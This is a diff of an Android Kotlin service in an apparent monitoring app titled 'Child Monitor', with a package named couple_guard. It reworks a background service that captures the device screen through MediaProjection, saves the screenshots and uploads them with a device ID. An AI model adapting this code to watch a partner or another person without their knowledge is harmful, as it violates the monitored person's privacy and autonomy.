@@ -1,526 +1,232 @@
-package com.example.couple_guard_child.services
+package com.example.couple_guard_child.services.background
 
 import android.app.*
 import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
-import android.hardware.display.DisplayManager
-import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
-import android.os.Build
-import android.os.Handler
-import android.os.IBinder
-import android.os.Looper
+import android.os.*
 import android.util.DisplayMetrics
 import android.util.Log
-import android.view.WindowManager
 import androidx.core.app.NotificationCompat
-import com.example.couple_guard_child.utils.ApiClient
 import java.io.File
 import java.io.FileOutputStream
+import java.text.SimpleDateFormat
+import java.util.*
+import com.example.couple_guard_child.NativeBridge
+import com.example.couple_guard_child.UploadHelper
 
 class ScreenCaptureBackgroundService : Service() {
+
     companion object {
-        private const val TAG = "ScreenCaptureService"
-        private const val NOTIFICATION_ID = 2002
-        private const val CHANNEL_ID = "screen_capture_channel"
-        
-        // ✅ Static variables to hold permission
-        private var mediaProjectionResultCode: Int? = null
-        private var mediaProjectionData: Intent? = null
-        private var hasPermission = false
+        const val ACTION_START = "ACTION_START"
+        const val ACTION_TAKE_SCREENSHOT = "ACTION_TAKE_SCREENSHOT"
+        const val ACTION_STOP = "ACTION_STOP"
+        const val EXTRA_RESULT_CODE = "extra_result_code"
+        const val EXTRA_RESULT_INTENT = "extra_result_intent"
+        const val CHANNEL_ID = "screen_capture_channel"
+        const val NOTIF_ID = 4242
 
-        // ✅ PREFS constants (must match ScreenCapturePermissionActivity)
-        private const val PREFS_NAME = "ScreenCapturePrefs"
-        private const val KEY_RESULT_CODE = "screen_capture_result_code"
-        private const val KEY_RESULT_DATA = "screen_capture_result_data"
-        private const val KEY_PERMISSION_GRANTED = "screen_capture_permission_granted"
+        private var active = false
 
-        /**
-         * Load MediaProjection permission from SharedPreferences
-         * MUST be called before starting capture
-         */
-        fun loadPermissionFromPrefs(context: Context): Boolean {
-            try {
-                Log.d(TAG, "========================================")
-                Log.d(TAG, "🔍 LOADING MEDIAPROJECTION PERMISSION")
-                
-                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                val rc = prefs.getInt(KEY_RESULT_CODE, -1)
-                val dataUri = prefs.getString(KEY_RESULT_DATA, null)
-                val granted = prefs.getBoolean(KEY_PERMISSION_GRANTED, false)
+        fun isActive(): Boolean = active
 
-                Log.d(TAG, "Result code: $rc")
-                Log.d(TAG, "Data URI exists: ${dataUri != null}")
-                Log.d(TAG, "Permission granted flag: $granted")
-
-                if (!granted || rc == -1 || dataUri == null) {
-                    Log.e(TAG, "❌ Permission not saved or incomplete")
-                    Log.d(TAG, "========================================")
-                    hasPermission = false
-                    return false
-                }
-
-                try {
-                    // ✅ Parse Intent from URI
-                    val intent = Intent.parseUri(dataUri, 0)
-                    
-                    // ✅ Save to static variables
-                    mediaProjectionResultCode = rc
-                    mediaProjectionData = intent
-                    hasPermission = true
-                    
-                    Log.d(TAG, "✅ MediaProjection permission loaded successfully")
-                    Log.d(TAG, "Result code: $rc")
-                    Log.d(TAG, "========================================")
-                    return true
-                    
-                } catch (e: Exception) {
-                    Log.e(TAG, "❌ Failed to parse MediaProjection intent", e)
-                    e.printStackTrace()
-                    hasPermission = false
-                    return false
-                }
-                
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Error loading MediaProjection permission", e)
-                e.printStackTrace()
-                Log.d(TAG, "========================================")
-                hasPermission = false
-                return false
-            }
-        }
-
-        /**
-         * Start screen capture service
-         * Permission MUST be loaded first!
-         */
-        fun startCapture(context: Context) {
-            Log.d(TAG, "========================================")
-            Log.d(TAG, "🖥️ START SCREEN CAPTURE REQUEST")
-            
-            // ✅ Double-check permission is loaded
-            if (!hasPermission) {
-                Log.w(TAG, "⚠️ Permission not in memory, loading from prefs...")
-                val loaded = loadPermissionFromPrefs(context)
-                if (!loaded) {
-                    Log.e(TAG, "❌ Cannot start: No MediaProjection permission")
-                    Log.e(TAG, "User must open app and grant permission first")
-                    Log.d(TAG, "========================================")
-                    return
-                }
-            }
-            
-            // ✅ Verify we have both code and data
-            if (mediaProjectionResultCode == null || mediaProjectionData == null) {
-                Log.e(TAG, "❌ Permission data incomplete")
-                Log.e(TAG, "Result code: $mediaProjectionResultCode")
-                Log.e(TAG, "Data: ${mediaProjectionData != null}")
-                Log.d(TAG, "========================================")
-                return
-            }
-
-            Log.d(TAG, "✅ Permission verified, starting service...")
-            
-            val intent = Intent(context, ScreenCaptureBackgroundService::class.java)
+        fun enqueueAction(context: Context, action: String) {
+            val i = Intent(context, ScreenCaptureBackgroundService::class.java)
+            i.action = action
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
+                context.startForegroundService(i)
             } else {
-                context.startService(intent)
+                context.startService(i)
             }
-            
-            Log.d(TAG, "========================================")
-        }
-        
-        /**
-         * Save permission (called by ScreenCapturePermissionActivity)
-         */
-        fun savePermission(resultCode: Int, data: Intent) {
-            mediaProjectionResultCode = resultCode
-            mediaProjectionData = data
-            hasPermission = true
-            Log.d(TAG, "✅ MediaProjection permission saved to memory")
-        }
-        
-        /**
-         * Check if permission is available
-         */
-        fun hasPermission(context: Context): Boolean {
-            if (hasPermission) return true
-            return loadPermissionFromPrefs(context)
         }
     }
 
     private var mediaProjection: MediaProjection? = null
-    private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
-    private val handler = Handler(Looper.getMainLooper())
-    private var captureAttempted = false
+    private var virtualDisplay: android.hardware.display.VirtualDisplay? = null
+    private var resultCode = Activity.RESULT_CANCELED
+    private var resultData: Intent? = null
+
+    override fun onBind(intent: Intent?) = null
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "========================================")
-        Log.d(TAG, "🖥️ ScreenCaptureBackgroundService created")
         createNotificationChannel()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "========================================")
-        Log.d(TAG, "🖥️ SCREEN CAPTURE SERVICE START")
-
-        // ✅ CRITICAL: Start foreground IMMEDIATELY
-        try {
-            startForeground(NOTIFICATION_ID, createNotification("Preparing screen capture..."))
-            Log.d(TAG, "✅ Started as foreground service")
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start foreground", e)
-            stopSelfSafely()
-            return START_NOT_STICKY
-        }
-
-        // ✅ Verify permission one more time
-        if (!hasPermission) {
-            Log.w(TAG, "⚠️ Permission lost, reloading...")
-            val loaded = loadPermissionFromPrefs(applicationContext)
-            if (!loaded) {
-                Log.e(TAG, "❌ Cannot proceed without permission")
-                stopSelfSafely()
-                return START_NOT_STICKY
+        when (intent?.action) {
+            ACTION_START -> {
+                resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
+                resultData = intent.getParcelableExtra(EXTRA_RESULT_INTENT)
+                startForeground(NOTIF_ID, buildNotification("Screen capture active"))
+                initProjection()
+                active = true
             }
-        }
-
-        if (mediaProjectionResultCode == null || mediaProjectionData == null) {
-            Log.e(TAG, "❌ Permission data is null")
-            stopSelfSafely()
-            return START_NOT_STICKY
-        }
-
-        Log.d(TAG, "✅ Permission verified")
-        Log.d(TAG, "Result code: $mediaProjectionResultCode")
-
-        // ✅ Small delay to ensure service is stable
-        handler.postDelayed({
-            if (!captureAttempted) {
-                captureScreen()
+            ACTION_TAKE_SCREENSHOT -> {
+                takeScreenshotAndUpload()
             }
-        }, 500)
-
-        return START_NOT_STICKY
-    }
-
-    private fun captureScreen() {
-        captureAttempted = true
-        
-        try {
-            Log.d(TAG, "Initializing MediaProjection...")
-            updateNotification("Initializing...")
-            
-            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) 
-                as MediaProjectionManager
-            
-            // ✅ Create MediaProjection with saved permission
-            mediaProjection = projectionManager.getMediaProjection(
-                mediaProjectionResultCode!!,
-                mediaProjectionData!!
-            )
-            
-            if (mediaProjection == null) {
-                Log.e(TAG, "❌ Failed to create MediaProjection")
-                Log.e(TAG, "Permission might have expired or been revoked")
-                
-                // ✅ Clear saved permission
-                clearPermission()
-                stopSelfSafely()
-                return
-            }
-            
-            Log.d(TAG, "✅ MediaProjection created")
-            
-            // ✅ Register callback to detect when permission is revoked
-            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
-                override fun onStop() {
-                    Log.w(TAG, "⚠️ MediaProjection stopped by system")
-                    clearPermission()
-                }
-            }, handler)
-            
-            updateNotification("Getting screen dimensions...")
-            
-            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
-            val metrics = DisplayMetrics()
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                val display = windowManager.defaultDisplay
-                display?.getRealMetrics(metrics)
-            } else {
-                @Suppress("DEPRECATION")
-                windowManager.defaultDisplay.getRealMetrics(metrics)
-            }
-            
-            val width = metrics.widthPixels
-            val height = metrics.heightPixels
-            val density = metrics.densityDpi
-            
-            Log.d(TAG, "Screen dimensions: ${width}x${height} @ ${density}dpi")
-            
-            updateNotification("Creating virtual display...")
-            
-            // ✅ Create ImageReader
-            imageReader = ImageReader.newInstance(
-                width, 
-                height, 
-                PixelFormat.RGBA_8888, 
-                2
-            )
-            
-            // ✅ Create VirtualDisplay
-            virtualDisplay = mediaProjection!!.createVirtualDisplay(
-                "ScreenCapture",
-                width,
-                height,
-                density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader!!.surface,
-                null,
-                handler
-            )
-            
-            if (virtualDisplay == null) {
-                Log.e(TAG, "❌ Failed to create VirtualDisplay")
-                stopSelfSafely()
-                return
-            }
-            
-            Log.d(TAG, "✅ VirtualDisplay created")
-            updateNotification("Capturing screen...")
-            
-            // ✅ Wait for frame to be available
-            handler.postDelayed({
-                captureImage()
-            }, 500)
-            
-        } catch (e: SecurityException) {
-            Log.e(TAG, "❌ SecurityException - Permission revoked?", e)
-            clearPermission()
-            stopSelfSafely()
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to capture screen", e)
-            e.printStackTrace()
-            stopSelfSafely()
-        }
-    }
-
-    private fun captureImage() {
-        try {
-            Log.d(TAG, "Acquiring image from ImageReader...")
-            updateNotification("Processing image...")
-            
-            val image = imageReader?.acquireLatestImage()
-            
-            if (image == null) {
-                Log.e(TAG, "❌ No image available")
-                
-                // ✅ Retry once
-                handler.postDelayed({
-                    val retryImage = imageReader?.acquireLatestImage()
-                    if (retryImage != null) {
-                        processImage(retryImage)
-                        retryImage.close()
-                    } else {
-                        Log.e(TAG, "❌ Retry failed, no image")
-                        stopSelfSafely()
-                    }
-                }, 1000)
-                return
-            }
-            
-            Log.d(TAG, "✅ Image acquired: ${image.width}x${image.height}")
-            processImage(image)
-            image.close()
-            
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to capture image", e)
-            e.printStackTrace()
-            stopSelfSafely()
-        }
-    }
-
-    private fun processImage(image: android.media.Image) {
-        try {
-            val planes = image.planes
-            val buffer = planes[0].buffer
-            val pixelStride = planes[0].pixelStride
-            val rowStride = planes[0].rowStride
-            val rowPadding = rowStride - pixelStride * image.width
-            
-            // ✅ Create bitmap with padding
-            val bitmap = Bitmap.createBitmap(
-                image.width + rowPadding / pixelStride,
-                image.height,
-                Bitmap.Config.ARGB_8888
-            )
-            
-            bitmap.copyPixelsFromBuffer(buffer)
-            
-            Log.d(TAG, "✅ Bitmap created: ${bitmap.width}x${bitmap.height}")
-            
-            saveAndSend(bitmap)
-            
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to process image", e)
-            e.printStackTrace()
-            stopSelfSafely()
-        }
-    }
-
-    private fun saveAndSend(bitmap: Bitmap) {
-        try {
-            Log.d(TAG, "Saving screenshot...")
-            updateNotification("Saving screenshot...")
-            
-            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
-            
-            FileOutputStream(file).use { out ->
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
-            }
-            
-            bitmap.recycle()
-            
-            Log.d(TAG, "✅ Screenshot saved: ${file.path}")
-            Log.d(TAG, "Size: ${file.length() / 1024} KB")
-            
-            updateNotification("Uploading...")
-            
-            // ✅ Upload in background thread
-            Thread {
-                try {
-                    val success = ApiClient.uploadScreenshot(
-                        applicationContext,
-                        file
-                    )
-                    
-                    if (success) {
-                        Log.d(TAG, "✅ Screenshot uploaded successfully")
-                    } else {
-                        Log.e(TAG, "❌ Failed to upload screenshot")
-                    }
-                    
-                } catch (e: Exception) {
-                    Log.e(TAG, "❌ Exception uploading screenshot", e)
-                } finally {
-                    try {
-                        file.delete()
-                        Log.d(TAG, "✅ Temp file deleted")
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Failed to delete temp file", e)
-                    }
-                }
-            }.start()
-            
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to save screenshot", e)
-            e.printStackTrace()
-        } finally {
-            stopSelfSafely()
-        }
-    }
-
-    private fun cleanup() {
-        try {
-            virtualDisplay?.release()
-            virtualDisplay = null
-            
-            imageReader?.close()
-            imageReader = null
-            
-            mediaProjection?.stop()
-            mediaProjection = null
-            
-            Log.d(TAG, "✅ Resources cleaned up")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error cleaning up", e)
-        }
-    }
-    
-    private fun clearPermission() {
-        try {
-            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-            prefs.edit().clear().apply()
-            
-            hasPermission = false
-            mediaProjectionResultCode = null
-            mediaProjectionData = null
-            
-            Log.d(TAG, "🗑️ Permission cleared")
-        } catch (e: Exception) {
-            Log.e(TAG, "Error clearing permission", e)
-        }
-    }
-
-    private fun stopSelfSafely() {
-        handler.postDelayed({
-            try {
-                cleanup()
-                stopForeground(true)
+            ACTION_STOP -> {
                 stopSelf()
-                Log.d(TAG, "✅ Service stopped")
-                Log.d(TAG, "========================================")
-            } catch (e: Exception) {
-                Log.e(TAG, "Error stopping service", e)
             }
-        }, 1000)
-    }
-
-    private fun updateNotification(message: String) {
-        try {
-            val notification = createNotification(message)
-            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            notificationManager.notify(NOTIFICATION_ID, notification)
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to update notification", e)
+            else -> {
+                // If no action, just ensure service stays
+                startForeground(NOTIF_ID, buildNotification("Screen capture service"))
+            }
         }
+        return START_STICKY
     }
 
-    private fun createNotification(message: String): Notification {
+    private fun buildNotification(text: String): Notification {
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Screen Capture")
-            .setContentText(message)
-            .setSmallIcon(android.R.drawable.ic_menu_gallery)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setAutoCancel(false)
+            .setContentTitle("Child Monitor")
+            .setContentText(text)
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
             .setOngoing(true)
-
         return builder.build()
     }
 
     private fun createNotificationChannel() {
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "Screen Capture",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Notifications for screen capture operations"
-                setShowBadge(false)
-                enableLights(false)
-                enableVibration(false)
-            }
-            
-            val notificationManager = getSystemService(NotificationManager::class.java)
-            notificationManager?.createNotificationChannel(channel)
-            
-            Log.d(TAG, "✅ Notification channel created")
+            val channel = NotificationChannel(CHANNEL_ID, "Screen Capture", NotificationManager.IMPORTANCE_LOW)
+            nm.createNotificationChannel(channel)
         }
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-    
+    private fun initProjection() {
+        if (resultData == null) {
+            Log.e("SCService","No projection data; cannot init")
+            return
+        }
+        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        mediaProjection = mgr.getMediaProjection(resultCode, resultData!!)
+        setupVirtualDisplay()
+    }
+
+    private fun setupVirtualDisplay() {
+        val metrics = DisplayMetrics()
+        val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
+        wm.defaultDisplay.getRealMetrics(metrics)
+        val width = metrics.widthPixels
+        val height = metrics.heightPixels
+        val density = metrics.densityDpi
+
+        // 🧠 Tambahkan callback dulu sebelum createVirtualDisplay()
+        mediaProjection?.registerCallback(object : MediaProjection.Callback() {
+            override fun onStop() {
+                super.onStop()
+                Log.w("SCService", "MediaProjection stopped by user or system.")
+                try {
+                    virtualDisplay?.release()
+                    imageReader?.close()
+                } catch (e: Exception) {
+                    Log.e("SCService", "Error releasing resources: $e")
+                } finally {
+                    stopSelf()
+                }
+            }
+        }, null)
+
+        // 🔧 Lanjut buat image reader
+        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+
+        // 🧱 Buat virtual display
+        virtualDisplay = mediaProjection?.createVirtualDisplay(
+            "ScreenCapture",
+            width,
+            height,
+            density,
+            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            imageReader?.surface,
+            null,
+            null
+        )
+
+        Log.i("SCService", "VirtualDisplay created: ${width}x${height}")
+    }
+
+
+    private fun takeScreenshotAndUpload() {
+        val reader = imageReader ?: run {
+            Log.e("SCService", "ImageReader null")
+            return
+        }
+
+        // Tunggu image muncul (kadang kosong kalau frame belum siap)
+        var image = reader.acquireLatestImage()
+        var tries = 0
+        while (image == null && tries < 5) {
+            tries++
+            try { Thread.sleep(200) } catch (_: InterruptedException) {}
+            image = reader.acquireLatestImage()
+        }
+
+        image ?: run { Log.e("SCService", "No image available"); return }
+
+        try {
+            val plane = image.planes[0]
+            val buffer = plane.buffer
+            val pixelStride = plane.pixelStride
+            val rowStride = plane.rowStride
+            val rowPadding = rowStride - pixelStride * image.width
+
+            // ✅ Simpan dulu ukuran sebelum image ditutup
+            val width = image.width
+            val height = image.height
+
+            val bmp = Bitmap.createBitmap(
+                width + rowPadding / pixelStride,
+                height,
+                Bitmap.Config.ARGB_8888
+            )
+            bmp.copyPixelsFromBuffer(buffer)
+            image.close()
+
+            // ✅ Pakai width & height yang sudah disimpan
+            val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
+
+            // Simpan & upload
+            val file = saveBitmapToFile(cropped)
+            file?.let {
+                val deviceId = NativeBridge.getDeviceId(this) ?: "unknown"
+                UploadHelper.uploadScreenshot(deviceId, it.absolutePath)
+            }
+
+        } catch (e: Exception) {
+            Log.e("SCService", "Screenshot error: $e")
+        } finally {
+            try { image?.close() } catch (_: Exception) {}
+        }
+    }
+
+
+    private fun saveBitmapToFile(bitmap: Bitmap): File? {
+        return try {
+            val dir = File(getExternalFilesDir(null), "captures")
+            if (!dir.exists()) dir.mkdirs()
+            val name = "capture_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.jpg"
+            val out = File(dir, name)
+            val fos = FileOutputStream(out)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, fos)
+            fos.flush()
+            fos.close()
+            out
+        } catch (e: Exception) {
+            Log.e("SCService","Save error: $e")
+            null
+        }
+    }
+
     override fun onDestroy() {
+        virtualDisplay?.release()
+        imageReader?.close()
+        mediaProjection?.stop()
+        active = false
         super.onDestroy()
-        cleanup()
-        Log.d(TAG, "Service destroyed")
     }
 }
